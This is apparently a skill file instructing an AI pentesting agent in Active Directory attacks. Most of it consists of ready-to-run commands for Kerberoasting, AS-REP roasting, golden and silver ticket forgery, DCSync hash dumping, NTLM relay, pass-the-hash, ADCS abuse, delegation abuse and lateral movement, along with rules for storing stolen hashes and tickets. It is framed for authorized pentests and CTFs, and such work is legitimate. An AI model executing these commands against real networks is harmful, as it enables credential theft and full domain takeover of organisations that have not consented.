---
name: cypher-ad
description: Active Directory attack methodology covering enumeration (BloodHound/SharpHound), Kerberoasting, AS-REP roasting, DCSync, delegation abuse (constrained/unconstrained/RBCD), ACL abuse, NTLM relay, ADCS attacks, and cross-trust exploitation.
version: 0.1.0
finding_types: [VULN_CANDIDATE, EXPLOIT_RESULT, CREDENTIAL, SESSION, LATERAL_PATH, PRIVESC_VECTOR]
destructiveness: high
tags: [ad, active-directory, kerberos, ldap, lateral-movement, privesc]
---

# Cypher Active Directory Skill

Use this skill for internal network pentests where Active Directory is present, CTF challenges (HTB/Proving Grounds AD boxes), and AD security assessments.

## Initial enumeration

### From Linux (non-domain-joined)
```bash
# LDAP enumeration (anonymous bind)
ldapsearch -H ldap://<dc-ip> -x -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName
# CrackMapExec / NetExec
netexec smb <dc-ip> --shares
netexec smb <subnet>/24
# Kerberos user enumeration (Kerbrute)
kerbrute userenum -d domain.com --dc <dc-ip> <userlist>
# DNS enumeration
dig -t SRV _kerberos._tcp.domain.com @<dc-ip>
dig -t SRV _ldap._tcp.domain.com @<dc-ip>
```

### From Windows / impacket
```bash
# Get domain info
nltest /dclist:domain
net view /domain
# BloodHound data collection
bloodhound-python -d domain.com -u user -p pass -ns <dc-ip> -c All
# or SharpHound.exe on a Windows host
```

## BloodHound analysis

Key paths to hunt in BloodHound:

| Path | Description |
|------|------------|
| Shortest Path to Domain Admins | Elevation path to DA |
| Kerberoastable users | Users with SPNs |
| AS-REP Roastable users | Users without Kerberos pre-auth |
| Constrained delegation | Service accounts that can impersonate any user to specific services |
| Unconstrained delegation | Computers that can extract TGTs when domain controllers authenticate to them |
| RBCD (Resource-Based Constrained Delegation) | Principals that can write msDS-AllowedToActOnBehalfOfOtherIdentity |
| DACL abuse | GenericAll/WriteDacl/WriteOwner/AddMember on high-value objects |
| GPO control | Principals that can modify GPOs applied to sensitive OUs |

## Kerberos attacks

### Kerberoasting
```bash
# Request TGS for SPN users, crack offline
impacket-GetUserSPNs domain.com/user:pass -request -dc-ip <dc-ip>
# Crack the TGS
hashcat -m 13100 kerberoast.txt wordlist.txt
# Targeted request (any domain user can request TGS for any SPN)
impacket-GetUserSPNs domain.com/user:pass -request-user sqlservice
```

### AS-REP roasting
```bash
# Users without Kerberos pre-authentication
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip <dc-ip>
# Crack AS-REP
hashcat -m 18200 asrep.txt wordlist.txt
```

### Silver Ticket (service-specific forgery)
```bash
# Forge a TGS for a specific service using the service account's NTLM hash
impacket-ticketer -nthash <service-hash> -domain-sid <sid> -domain domain.com -spn cifs/dc.domain.com user
# Export KRB5CCNAME=/path/to/ticket.ccache
```

### Golden Ticket (domain-wide forgery)
```bash
# Forge a TGT using krbtgt hash (requires Domain Admin level access)
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <sid> -domain domain.com user
```

### DCSync
```bash
# Replication rights abuse — dump all domain hashes
impacket-secretsdump domain.com/user:pass@<dc-ip>
# Requires: Replicating Directory Changes (DS-Replication-Get-Changes) right
```

## NTLM attacks

### NTLM relay
```bash
# Responder: poison name resolution, capture Net-NTLMv2 hashes
responder -I eth0 -wd
# ntlmrelayx: relay captured hashes to target services
impacket-ntlmrelayx -t smb://<target-ip> -smb2support -socks
```

### Pass-the-Hash
```bash
# Use NTLM hash without knowing plaintext
impacket-psexec -hashes :<ntlm-hash> domain/user@<target>
impacket-wmiexec -hashes :<ntlm-hash> domain/user@<target>
netexec smb <target> -u user -H <ntlm-hash> -x 'whoami'
```

### Pass-the-Ticket
```bash
# Export and reuse Kerberos tickets
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain/user@<target>
```

## ADCS (Active Directory Certificate Services) attacks

- **ESC1**: Template allows SAN (Subject Alternative Name) → request cert as any user (including DA)
- **ESC2**: Template has Any Purpose EKU or no EKU
- **ESC3**: Enrollment Agent template → request cert on behalf of another user
- **ESC4**: Write access to template → modify to enable SAN or remove manager approval
- **ESC6**: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
- **ESC8**: ADCS HTTP endpoint vulnerable to NTLM relay → relay DA NTLM to /certsrv

Tool: **Certipy** — `certipy find -u user -p pass -dc-ip <dc> -vulnerable`

## Delegation abuse

### Unconstrained delegation
1. Compromise computer with unconstrained delegation.
2. Coerce a Domain Controller to authenticate to it: `petitpotam`, `printerbug`, `dfscoerce`.
3. Extract the DC's TGT from memory (mimikatz / Rubeus).
4. Use the TGT for DCSync.

### Constrained delegation
- Service A can impersonate any user to Service B.
- If Service A is compromised → request TGS as any user (including DA) to Service B.

### RBCD (Resource-Based Constrained Delegation)
- Attacker controls a computer account → configure `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target.
- Request S4U2Self + S4U2Proxy → get TGS as any user to the target.

## Lateral movement

```bash
# WMI
impacket-wmiexec domain/user:pass@<target>
# PSExec
impacket-psexec domain/user:pass@<target>
# Scheduled Tasks
impacket-atexec domain/user:pass@<target> 'cmd.exe /c whoami'
# WinRM
evil-winrm -i <target> -u user -p pass
# RDP
xfreerdp /u:user /p:pass /v:<target>
```

## Evidence rules

- Save enumeration output to `/mnt/project/recon/bloodhound/`, `/mnt/project/recon/ldap/`.
- Save extracted hashes to `/mnt/project/exploit/hashes.txt` (REDACT in facts, keep as evidence).
- Save Kerberos tickets to `/mnt/project/exploit/tickets/`.
- Document each lateral movement hop: source, target, method, user context.
- Track the full attack path from initial access → Domain Admin.

## Prefix examples

```text
[cypher:finding type=VULN_CANDIDATE confidence=0.95 severity=high tags=ad,kerberoast artifacts=/mnt/project/exploit/kerberoast-hashes.txt cleanup=none] Kerberoasting reveals `sqlservice` account with weak password `Summer2024!` — SPN: MSSQLSvc/sql01.domain.com.
```

```text
[cypher:finding type=EXPLOIT_RESULT confidence=0.99 severity=critical tags=ad,dcsync artifacts=/mnt/project/exploit/ntds-dump.log cleanup=done] DCSync executed from `sqlservice` → Domain Admin via unconstrained delegation on SQL01. Full NTDS.dit extracted. Cleanup: DA access removed.
```
